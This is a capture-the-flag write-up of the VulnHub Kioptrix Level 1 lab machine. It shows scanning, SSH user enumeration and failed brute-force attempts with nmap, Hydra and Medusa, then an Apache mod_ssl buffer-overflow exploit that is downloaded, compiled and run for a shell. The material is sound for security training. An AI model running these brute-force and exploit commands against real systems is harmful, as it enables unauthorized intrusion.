# Kioptrix Level 1 Writeup

## Machine Info
    -Platform: VulnHub
    -Name: Kioptrix Level 1
    -Link: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
    -Difficulty: Easy

## Step 1: Finding the Target IP

    Command: arp-scan -l

<img width="958" height="615" alt="2 arp-scan" src="https://github.com/user-attachments/assets/95810464-1cd6-406f-87eb-0e65647c2774" />


## Step 2: Port Scanning

    Command: nmap -A Target-IP

<img width="1263" height="697" alt="3 scan-result" src="https://github.com/user-attachments/assets/6c5474a0-6978-40f6-aafc-1ecbd973ee97" />



## Step 3: Enumrating SSH Users Through Metasploit-Framework

    use auxiliary/scanner/ssh/ssh_enumusers

<img width="1006" height="362" alt="5 SSH(enumration)" src="https://github.com/user-attachments/assets/ccaf8ee2-c77d-48ed-a453-272d7e24dcdc" />

### User Enumration Output :
    root
    adm
    john
    apache
    harold
    nobody
    ftp
    


## Step 4: SSH Brute-Force Attempts (Failed):

I Attempted To Brute-Force SSH Using Multiple Tools:

###  a) Using Nmap

    Command: nmap Target-IP -p 22 --script ssh-brute-nse --script-args userdb= <username.txt>
    
<img width="743" height="807" alt="7 SSH(Brute-Force-Nmap)" src="https://github.com/user-attachments/assets/3bf9b5ec-d474-45ef-b3a6-78452d665361" />


Result: Scan was very slow and No valid credentials found.
 
###  b) Using Hydra

    Command: Hydra -L <username.txt> -P /usr/share/wordlists/rockyou.txt ssh://Target-IP
    
<img width="1582" height="217" alt="8 SSH(Brute-Force-Hydra)" src="https://github.com/user-attachments/assets/bd71e13b-3397-43a2-ae3b-594df60a22e3" />


Result: Encountered error related to encryption/authentication.

### c) Using Medusa

    Command:medusa -h Target-IP -U <username.txt> -P /usr/share/wordlists/rockyou.txt -M ssh
    
<img width="1337" height="728" alt="9 SSH(Brute-Force-Medusa)" src="https://github.com/user-attachments/assets/1f65c432-bb21-4ae9-9c0c-e0657511e02e" />


Result: No credentials found even after long period of time.

### Conclusion
SSH was not a viable attack vector, So I shifted my focus to Port: 80



## Step 5: Port: 80 Vulnerability Assessment

### Using searchsploit

<img width="1453" height="779" alt="11 Apache(Searchsploit)" src="https://github.com/user-attachments/assets/5d17cef9-2a80-40ff-9a55-f4c1d4d31b29" />

### Confirming Unix Remote Buffer Overflow "OpenFuckV2.c" Details

<img width="692" height="646" alt="10 Apache(Vuln)" src="https://github.com/user-attachments/assets/c2e901b7-cfeb-40a5-add9-a1f4bfc22c20" />



## Step 6: Downloading The 'OpenFuckV2.c' Exploit And Configuring It

    Link: https://github.com/heltonWernik/OpenLuck/blob/master/OpenFuck.c
    Install required Library: apt-get install libssl-dev
    Compile The Exploit: gcc -o OpenFuck OpenFuck.c -lcrypto


## Step 7: Exploitation 

    Run: ./OpenFuck

Find the version of the target machine ("In this case RedHat Linux") And the version of apache service ("In this case Apache 1.3.20") in the output.

<img width="813" height="663" alt="13 (Apache-Version)" src="https://github.com/user-attachments/assets/cd2be0ee-8f86-4d32-9f52-d472b782408a" />

    Run: ./OpenFuck 0x6b Target-IP -c 50



## Result: Gaining Shell

<img width="1056" height="750" alt="14 (Exploit-Success-Shell)" src="https://github.com/user-attachments/assets/a8d6c93c-04af-4ed6-b675-4df9d1013018" />







